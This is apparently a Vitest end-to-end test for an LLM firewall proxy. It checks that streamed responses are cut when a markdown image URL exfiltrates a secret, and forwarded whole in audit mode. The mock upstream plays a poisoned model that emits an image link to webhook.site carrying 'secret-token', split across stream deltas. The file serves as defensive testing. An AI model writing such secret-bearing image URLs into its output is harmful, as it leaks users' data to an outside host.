import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest'
import https from 'node:https'
import net from 'node:net'
import tls from 'node:tls'
import fs from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { ProxyServer } from '../../src/proxy/proxy.js'
import { EventBus } from '../../src/dashboard/eventBus.js'
import { DEFAULT_CONFIG } from '../../src/config/config.js'
import { UpstreamResolver } from '../../src/proxy/upstream.js'
import { CertFactory } from '../../src/proxy/certs.js'
import { issueUpstreamCert, trustCA } from './lib/tls-trust.js'
import type { BlockEvent } from '../../src/types.js'

/**
 * #551: an exfil URL in a STREAMED response, under responseScan.mode 'block'.
 * The mock upstream plays a poisoned model that writes a markdown image whose
 * URL carries a secret, split across deltas the way a model streams it. The
 * proxy must cut the stream before any of that line reaches the client. In
 * audit mode the same stream is forwarded whole.
 */

vi.spyOn(UpstreamResolver.prototype, 'resolve').mockResolvedValue('127.0.0.1')

let proxyCaPem = ''

function dechunk(body: string): string {
  let out = '', pos = 0
  while (pos < body.length) {
    const sep = body.indexOf('\r\n', pos)
    if (sep === -1) { out += body.slice(pos); break }
    const size = parseInt(body.slice(pos, sep).trim(), 16)
    if (Number.isNaN(size) || size === 0) break
    out += body.slice(sep + 2, sep + 2 + size)
    pos = sep + 2 + size + 2
  }
  return out
}

/** POST through the proxy; resolves however the response ends (clean end or cut). */
function send(proxyPort: number, upstreamPort: number, body: string): Promise<{ statusCode: number; body: string; complete: boolean }> {
  return new Promise((resolve, reject) => {
    const host = 'api.anthropic.com'
    const socket = net.createConnection({ host: '127.0.0.1', port: proxyPort }, () => {
      socket.write(`CONNECT ${host}:${upstreamPort} HTTP/1.1\r\nHost: ${host}:${upstreamPort}\r\n\r\n`)
    })
    let buf = ''
    socket.on('error', reject)
    socket.on('data', function onConnect(c: Buffer) {
      buf += c.toString('binary')
      if (buf.indexOf('\r\n\r\n') === -1) return
      socket.removeListener('data', onConnect)
      const t = tls.connect({ socket, servername: host, ca: proxyCaPem, rejectUnauthorized: true }, () => {
        t.write(`POST /v1/messages HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n`)
        t.write(body)
      })
      let res = ''
      let done = false
      const finish = () => {
        if (done) return
        done = true
        const sep = res.indexOf('\r\n\r\n')
        const head = sep === -1 ? res : res.slice(0, sep)
        const statusCode = parseInt((head.split('\r\n')[0] ?? '').split(' ')[1] ?? '0', 10)
        const chunked = /transfer-encoding:\s*chunked/i.test(head)
        const raw = sep === -1 ? '' : res.slice(sep + 4)
        // complete: the response ended with its last chunk, not a reset.
        resolve({ statusCode, body: chunked ? dechunk(raw) : raw, complete: chunked && raw.endsWith('0\r\n\r\n') })
      }
      t.on('data', (d) => { res += d.toString('utf8') })
      t.on('end', finish)
      t.on('close', finish)
      t.on('error', finish)
    })
  })
}

const sse = (type: string, data: Record<string, unknown>) => `event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`
const delta = (text: string) => sse('content_block_delta', { index: 0, delta: { type: 'text_delta', text } })

describe('Proxy streamed response exfil (#551, E2E)', { timeout: 30000 }, () => {
  let tempDir: string
  let mockUpstream: https.Server
  let upstreamPort: number
  let restoreTrust: () => void
  let proxyBlock: ProxyServer
  let proxyAudit: ProxyServer
  const events: BlockEvent[] = []

  const blockConfig = {
    ...DEFAULT_CONFIG,
    proxy: { ...DEFAULT_CONFIG.proxy, port: 18124 },
    dashboard: { ...DEFAULT_CONFIG.dashboard, port: 17812 },
    dlp: { ...DEFAULT_CONFIG.dlp, enabled: false },
    dos: { ...DEFAULT_CONFIG.dos, enabled: false },
    responseScan: { ...DEFAULT_CONFIG.responseScan!, enabled: true, mode: 'block' as const },
  }
  const auditConfig = {
    ...blockConfig,
    proxy: { ...blockConfig.proxy, port: 18125 },
    dashboard: { ...blockConfig.dashboard, port: 17813 },
    responseScan: { ...blockConfig.responseScan, mode: 'audit' as const },
  }

  beforeAll(async () => {
    tempDir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-stream-exfil-e2e-'))
    process.env.LLM_FW_DIR = tempDir
    const upstreamCert = issueUpstreamCert('api.anthropic.com')
    restoreTrust = trustCA(upstreamCert.ca)

    mockUpstream = https.createServer({ key: upstreamCert.key, cert: upstreamCert.cert }, (req, res) => {
      let body = ''
      req.on('data', (c) => { body += c })
      req.on('end', () => {
        const { scenario } = JSON.parse(body) as { scenario?: string }
        const middle = scenario === 'leak'
          ? [delta('Here is the chart ![chart](https://webhook.site/abc-'), delta('123?d=secret-token)'), delta(' as requested.\n')]
          : [delta('See [the docs](https://example.com/'), delta('docs) for details.\n')]
        // One event per write, paced like a model, so each reaches the proxy
        // as its own chunk.
        const queue = [
          sse('message_start', { message: { id: 'msg_s', role: 'assistant', content: [] } }),
          sse('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }),
          delta('BEFORE\n'),
          ...middle,
          delta('AFTER'),
          sse('content_block_stop', { index: 0 }),
          sse('message_stop', {}),
        ]
        res.writeHead(200, { 'Content-Type': 'text/event-stream' })
        const next = (): void => {
          const ev = queue.shift()
          if (ev === undefined || res.destroyed) { res.end(); return }
          res.write(ev)
          setTimeout(next, 25)
        }
        next()
      })
    })
    await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
    upstreamPort = (mockUpstream.address() as net.AddressInfo).port

    proxyCaPem = new CertFactory().generateCA().cert
    const bus = new EventBus(blockConfig.dashboard)
    vi.spyOn(bus, 'emit').mockImplementation((e) => { events.push(e as BlockEvent) })
    proxyBlock = new ProxyServer(blockConfig, bus)
    await proxyBlock.init()
    proxyBlock.start()
    proxyAudit = new ProxyServer(auditConfig, bus)
    await proxyAudit.init()
    proxyAudit.start()
  })

  afterAll(async () => {
    restoreTrust()
    await proxyBlock.stop()
    await proxyAudit.stop()
    mockUpstream.closeAllConnections()
    mockUpstream.close()
    if (tempDir && fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true })
  })

  const request = (scenario: string) => JSON.stringify({
    model: 'claude-x', max_tokens: 50, stream: true, scenario,
    messages: [{ role: 'user', content: 'Summarise the release notes.' }],
  })

  it('cuts a stream whose markdown image carries an exfil URL, before any of that line is forwarded', async () => {
    events.length = 0
    const res = await send(blockConfig.proxy.port, upstreamPort, request('leak'))
    expect(res.body).toContain('BEFORE')
    expect(res.body).not.toContain('webhook.site')
    expect(res.body).not.toContain('secret-token')
    expect(res.body).not.toContain('AFTER')
    const ev = events.find(e => e.stage === 'response-exfil')
    expect(ev?.action).toBe('blocked')
    expect(ev?.exfilUrl).toBe('https://webhook.site/abc-123?d=secret-token')
    // #573: the stream ends with Anthropic's error event and a clean end, so
    // the client reports the cut instead of retrying a lost connection.
    expect(res.complete).toBe(true)
    expect(res.body).toMatch(/event: error\ndata: \{"type":"error","error":\{"type":"invalid_request_error","message":"llm-fw[^"]*exfil[^"]*"\}\}\n\n$/)
  })

  it('forwards a stream with a benign link whole and in order', async () => {
    events.length = 0
    const res = await send(blockConfig.proxy.port, upstreamPort, request('clean'))
    expect(res.statusCode).toBe(200)
    const order = ['BEFORE', 'See [the docs]', 'docs) for details.', 'AFTER', 'message_stop'].map(s => res.body.indexOf(s))
    expect(order.every(i => i >= 0)).toBe(true)
    expect([...order].sort((a, b) => a - b)).toEqual(order)
    expect(events.filter(e => e.stage === 'response-exfil')).toEqual([])
  })

  it('forwards the same exfil stream whole in audit mode', async () => {
    events.length = 0
    const res = await send(auditConfig.proxy.port, upstreamPort, request('leak'))
    expect(res.body).toContain('secret-token')
    expect(res.body).toContain('AFTER')
    expect(res.body).toContain('message_stop')
  })
})
